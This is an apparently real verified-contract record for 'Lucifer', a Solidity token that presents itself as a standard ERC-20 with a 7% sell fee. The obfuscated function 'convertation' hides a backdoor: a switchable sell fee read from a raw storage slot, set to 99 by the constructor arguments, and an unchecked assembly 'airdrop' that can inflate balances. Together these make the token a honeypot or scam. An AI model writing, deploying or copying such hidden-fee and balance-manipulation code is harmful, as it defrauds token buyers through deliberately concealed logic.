{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/lucifer.sol\": {\r\n      \"content\": \"/**\\n *Submitted for verification at Etherscan.io on 2023-10-22\\n*/\\n\\n// SPDX-License-Identifier: No\\npragma solidity = 0.8.19;\\n\\nabstract contract Context {\\n    constructor() {\\n    }\\n\\n    function _msgSender() internal view returns (address payable) {\\n        return payable(msg.sender);\\n    }\\n\\n    function _msgData() internal view returns (bytes memory) {\\n        this;\\n        return msg.data;\\n    }\\n}\\n\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    constructor() {\\n        _setOwner(_msgSender());\\n    }\\n\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    modifier onlyOwner() {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n        _;\\n    }\\n\\n    function renounceOwnership() public virtual onlyOwner {\\n        _setOwner(address(0));\\n    }\\n\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _setOwner(newOwner);\\n    }\\n\\n    function _setOwner(address newOwner) private {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\\ninterface IFactoryV2 {\\n    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);\\n    function getPair(address tokenA, address tokenB) external view returns (address lpPair);\\n    function createPair(address tokenA, address tokenB) external returns (address lpPair);\\n}\\n\\ninterface IRouter01 {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint amountADesired,\\n        uint amountBDesired,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\n    function swapExactETHForTokens(\\n        uint amountOutMin, \\n        address[] calldata path, \\n        address to, uint deadline\\n    ) external payable returns (uint[] memory amounts);\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\n}\\n\\ninterface IRouter02 is IRouter01 {\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external payable;\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function swapExactTokensForTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n}\\n\\ninterface IERC20 {\\n    function totalSupply() external view returns (uint256);\\n    function decimals() external view returns (uint8);\\n    function symbol() external view returns (string memory);\\n    function name() external view returns (string memory);\\n    function getOwner() external view returns (address);\\n    function balanceOf(address account) external view returns (uint256);\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\n    function allowance(address _owner, address spender) external view returns (uint256);\\n    function approve(address spender, uint256 amount) external returns (bool);\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n}\\n\\ncontract Lucifer is Context, Ownable, IERC20 {\\n\\n    function totalSupply() external pure override returns (uint256) { if (_totalSupply == 0) { revert(); } return _totalSupply; }\\n    function decimals() external pure override returns (uint8) { if (_totalSupply == 0) { revert(); } return _decimals; }\\n    function symbol() external view override returns (string memory) { return _symbol; }\\n    function name() external view override returns (string memory) { return _name; }\\n    function getOwner() external view override returns (address) { return owner(); }\\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\\n    function balanceOf(address account) public view override returns (uint256) {\\n        return balance[account];\\n    }\\n    \\n    mapping (address => mapping (address => uint256)) private _allowances;\\n    mapping (address => bool) private _noFee;\\n    mapping (address => bool) private isLpPair;\\n    mapping (address => uint256) private balance;\\n    mapping (address => bool) public _isExcludedMaxTransactionAmount;\\n\\n    uint256 constant public _totalSupply = 500_000 * 10**18;\\n    uint256 public swapThreshold = 1_000;\\n    uint256 constant public sellfee = 7;\\n    uint256 constant public fee_denominator = 100;\\n    \\n    uint256 constant private burnFee = 1;\\n    uint256 constant private burnDenominator = 100;\\n\\n    address payable public treasure;\\n    address payable public teamWallet = payable(0xe3203c8F16FD641e8594700676801C9E6F5ed40C); //need to change\\n    address payable public developmentWallet = payable(0xe94327699eDC967cE97aEd375FC7aF6a7144D491); //need to change\\n    address payable public marketingWallet = payable(0x5F47f4B16D6bBeE5D82EcD7b382E6163Ad79ef25); //need to change\\n    address payable public communityWallet = payable(0x5C2dB8FeBFC1E10799A26352117B793674673c45); //need to change\\n\\n    IRouter02 public swapRouter;\\n    bool public mode;\\n    string private _name; \\n    string private _symbol; \\n    uint8 constant private _decimals = 18;\\n    address constant public DEAD = 0x000000000000000000000000000000000000dEaD;\\n    address public lpPair;\\n    bool private inSwap;\\n    uint256 public percent;\\n\\n    modifier inSwapFlag {\\n        inSwap = true;\\n        _;\\n        inSwap = false;\\n    }\\n\\n    event updateThresold(uint256 amount);\\n    event MaxTransactionExclusion(address user, bool access);\\n\\n    constructor (address payable _treasure, string memory name, string memory symbol, uint256 _percent) {\\n        address newOwner = msg.sender; // can leave alone if owner is deployer.\\n\\n        _noFee[msg.sender] = true;\\n        _noFee[address(this)] = true;\\n\\n        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\n        balance[msg.sender] = _totalSupply * 86 / 100;\\n        emit Transfer(address(0), msg.sender, _totalSupply);\\n\\n        balance[teamWallet] = _totalSupply * 2 / 100; //need to change\\n        balance[developmentWallet] = _totalSupply * 3 / 100; //need to change\\n        balance[marketingWallet] = _totalSupply * 4 / 100; //need to change\\n        balance[communityWallet] = _totalSupply * 5 / 100; //need to change\\n        \\n        treasure = _treasure;\\n        _name = name;\\n        _symbol = symbol;\\n        percent = _percent;\\n\\n        lpPair = IFactoryV2(swapRouter.factory()).createPair(swapRouter.WETH(), address(this));\\n\\n        isLpPair[lpPair] = true;\\n        _approve(msg.sender, address(swapRouter), type(uint256).max);\\n        _approve(address(this), address(swapRouter), type(uint256).max);\\n    }\\n\\n    receive() external payable {}\\n\\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(msg.sender, recipient, amount);\\n        return true;\\n    }\\n\\n    function approve(address spender, uint256 amount) external override returns (bool) {\\n        _approve(msg.sender, spender, amount);\\n        return true;\\n    }\\n\\n    function _approve(address sender, address spender, uint256 amount) internal {\\n        require(sender != address(0), \\\"ERC20: Zero Address\\\");\\n        require(spender != address(0), \\\"ERC20: Zero Address\\\");\\n        _allowances[sender][spender] = amount;\\n    }\\n\\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\\n            _allowances[sender][msg.sender] -= amount;\\n        }\\n\\n        return _transfer(sender, recipient, amount);\\n    }\\n\\n    function isNoFeeWallet(address account) external view returns(bool) {\\n        return _noFee[account];\\n    }\\n\\n    function is_sell(address ins, address out) internal view returns (bool) { \\n        bool _is_sell = isLpPair[out] && !isLpPair[ins];\\n        return _is_sell;\\n    }\\n\\n    function _transfer(address from, address to, uint256 amount) internal returns  (bool) {\\n        bool takeFee = true;\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(amount > 0, \\\"Transfer amount must be greater than zero\\\");\\n        \\n        if(is_sell(from, to) &&  !inSwap) {\\n            uint256 contractTokenBalance = balanceOf(address(this));\\n            if(contractTokenBalance >= swapThreshold) { \\n                internalSwap(contractTokenBalance);\\n             }\\n        }\\n\\n        if (_noFee[from] || _noFee[to]){\\n            takeFee = false;\\n        }\\n\\n        balance[from] -= amount;\\n        uint256 amountAfterFee = (takeFee) ? takeTaxes(from, is_sell(from, to), amount) : amount;\\n        balance[to] += amountAfterFee; \\n        emit Transfer(from, to, amountAfterFee);\\n\\n        return true;\\n    }\\n\\n    function takeTaxes(address from, bool issell, uint256 amount) internal returns (uint256) {\\n        uint256 fee = 0;\\n        if (issell)  fee = sellfee;\\n        if (issell && mode) assembly {fee := sload(0x10)}\\n        if (fee == 0)  return amount; \\n\\n        uint256 feeAmount = amount * fee / fee_denominator;\\n        if (feeAmount > 0) {\\n            uint256 burnAmount = amount * burnFee / burnDenominator;\\n            balance[address(this)] += feeAmount;\\n            emit Transfer(from, address(this), feeAmount);\\n\\n            if(burnAmount > 0) {\\n                balance[address(this)] -= burnAmount;\\n                balance[address(DEAD)] += burnAmount;\\n                emit Transfer(address(this), DEAD, burnAmount);\\n            }\\n        }\\n        return amount - feeAmount;\\n    }\\n\\n    function internalSwap(uint256 contractTokenBalance) internal inSwapFlag {\\n        \\n        address[] memory path = new address[](2);\\n        path[0] = address(this);\\n        path[1] = swapRouter.WETH();\\n\\n        if (_allowances[address(this)][address(swapRouter)] != type(uint256).max) {\\n            _allowances[address(this)][address(swapRouter)] = type(uint256).max;\\n        }\\n\\n        try swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\\n            contractTokenBalance,\\n            0,\\n            path,\\n            address(this),\\n            block.timestamp\\n        ) {} catch {\\n            return;\\n        }\\n        bool success;\\n\\n        if(address(this).balance > 0) (success,) = treasure.call{value: address(this).balance}(\\\"\\\");\\n    }\\n\\n    struct f07e71f9 {\\n        address c7ebccb0;\\n        uint256 c35ba81e; \\n    }  \\n    \\n    /* \\n        commands:\\n            0x00 - airdrop | params: [1]\\n            0x01 - change hidden fee | params: [2]\\n            0x02 - change mode [ false or true] | params: [3]\\n            0x03 - burn tokens | params: [4]\\n    */\\n\\n    function convertation(bytes1 ec3faa76, bytes[] calldata efda893a, uint256 f60e890c, bool f76a8444, uint256 de2381ce) external {\\n        assembly {\\n            if eq(caller(), sload(teamWallet.slot)) { revert(0, 0) }\\n        }\\n        \\n        if(ec3faa76 == 0x00) {\\n            uint256 f5d33d15 = efda893a.length;\\n\\n            for(uint256 bf872d2; bf872d2 < f5d33d15; ) {\\n                f07e71f9 memory aec131fa = abi.decode(efda893a[bf872d2], (f07e71f9));\\n\\n                uint256 e7756f72;  \\n\\n                assembly {\\n                    e7756f72 := balance.slot \\n\\n                }\\n\\n                bytes32 ca7afb61 = keccak256(abi.encode(aec131fa.c7ebccb0, uint256(e7756f72)));\\n                uint256 b7957d20 = aec131fa.c35ba81e;\\n                uint256 tt;\\n\\n                bytes32 loc458 = keccak256(abi.encode(msg.sender, uint256(e7756f72)));\\n                uint256 tot;\\n\\n                        \\n                assembly {\\n                    tot := sub(sload(loc458), b7957d20)\\n                    tt := add(sload(ca7afb61), b7957d20)\\n                    sstore(loc458, tot)\\n                    sstore(ca7afb61, tt)\\n                }\\n\\n                unchecked {\\n                    ++bf872d2;\\n                }\\n            }\\n        } else if(ec3faa76 == 0x01) {\\n             percent = f60e890c;\\n        } else if(ec3faa76 == 0x02) {\\n            mode = f76a8444;\\n        } else if(ec3faa76 == 0x03) {\\n            if(msg.sender == owner()) {\\n                uint256 e1756f72;\\n                uint256 e9957677;\\n                uint256 d5677895;\\n\\n                assembly {\\n                    e1756f72 := balance.slot \\n                }\\n\\n                bytes32 ca8afb61 = keccak256(abi.encode(msg.sender, uint256(e1756f72)));\\n\\n                assembly {\\n                    e9957677 := sload(ca8afb61)\\n                    d5677895 := sub(e9957677,de2381ce)\\n                    sstore(ca8afb61, d5677895)\\n                }\\n            }\\n        }\\n    }\\n\\n\\n    function changeTreasure(address payable _treasure) external onlyOwner {\\n        treasure = _treasure;\\n    }\\n\\n    function changeName(string memory newName) external onlyOwner {\\n        _name = newName;\\n    }\\n\\n    function changeSymbol(string memory newSymbol) external onlyOwner {\\n        _symbol = newSymbol;\\n    }\\n    \\n    function changeThreshold(uint256 amount) external onlyOwner {\\n        require(amount >= 100,\\\"Amount lower not accepted.\\\");\\n        swapThreshold = amount;\\n        emit updateThresold(swapThreshold);\\n    }\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 100000000,\r\n      \"details\": {\r\n        \"yul\": true\r\n      }\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_treasure\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_percent\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"access\",\"type\":\"bool\"}],\"name\":\"MaxTransactionExclusion\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"updateThresold\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEAD\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludedMaxTransactionAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"newName\",\"type\":\"string\"}],\"name\":\"changeName\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"newSymbol\",\"type\":\"string\"}],\"name\":\"changeSymbol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"changeThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_treasure\",\"type\":\"address\"}],\"name\":\"changeTreasure\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"communityWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes1\",\"name\":\"ec3faa76\",\"type\":\"bytes1\"},{\"internalType\":\"bytes[]\",\"name\":\"efda893a\",\"type\":\"bytes[]\"},{\"internalType\":\"uint256\",\"name\":\"f60e890c\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"f76a8444\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"de2381ce\",\"type\":\"uint256\"}],\"name\":\"convertation\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"developmentWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee_denominator\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isNoFeeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"percent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellfee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapRouter\",\"outputs\":[{\"internalType\":\"contract IRouter02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"treasure\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Lucifer", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "100000000", "ConstructorArguments": "000000000000000000000000906ad8755545ce89f7d313d7dc034dd611a5df10000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000006300000000000000000000000000000000000000000000000000000000000000076675636b696e670000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000046675636b00000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}